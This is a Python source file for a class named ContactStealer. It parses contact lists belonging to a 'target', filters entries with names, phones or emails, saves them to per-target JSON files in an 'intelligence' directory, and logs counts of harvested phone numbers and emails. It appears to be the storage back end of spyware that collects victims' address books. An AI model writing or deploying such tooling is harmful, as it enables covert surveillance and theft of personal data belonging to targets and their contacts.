import json
import os
import logging
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

class ContactStealer:
    def __init__(self, output_dir: str = "/intelligence/contacts/"):
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def process_contacts(self, target_id: str, raw_contacts_data: str) -> Dict[str, Any]:
        try:
            contacts = json.loads(raw_contacts_data)
            if not isinstance(contacts, list):
                logger.error("Invalid contacts data: not a list")
                return {"success": False, "error": "Invalid format"}
            validated = self._validate_contacts(contacts)
            file_path = self._save_contacts(target_id, validated)
            self._analyze_contacts(target_id, validated)
            return {"success": True, "count": len(validated), "path": file_path}
        except json.JSONDecodeError:
            logger.error("Invalid JSON")
            return {"success": False, "error": "Invalid JSON"}

    def _validate_contacts(self, contacts: List[Dict]) -> List[Dict]:
        valid = []
        for c in contacts:
            if isinstance(c, dict) and ('name' in c or 'phone' in c or 'email' in c):
                valid.append(c)
        return valid

    def _save_contacts(self, target_id: str, contacts: List[Dict]) -> str:
        filename = f"{target_id}_contacts.json"
        full_path = os.path.join(self.output_dir, filename)
        with open(full_path, 'w', encoding='utf-8') as f:
            json.dump(contacts, f, indent=2, ensure_ascii=False)
        logger.info(f"Saved {len(contacts)} contacts to {full_path}")
        return full_path

    def _analyze_contacts(self, target_id: str, contacts: List[Dict]) -> None:
        phones = [c.get('phone') for c in contacts if c.get('phone')]
        emails = [c.get('email') for c in contacts if c.get('email')]
        logger.info(f"Target {target_id}: {len(phones)} phones, {len(emails)} emails")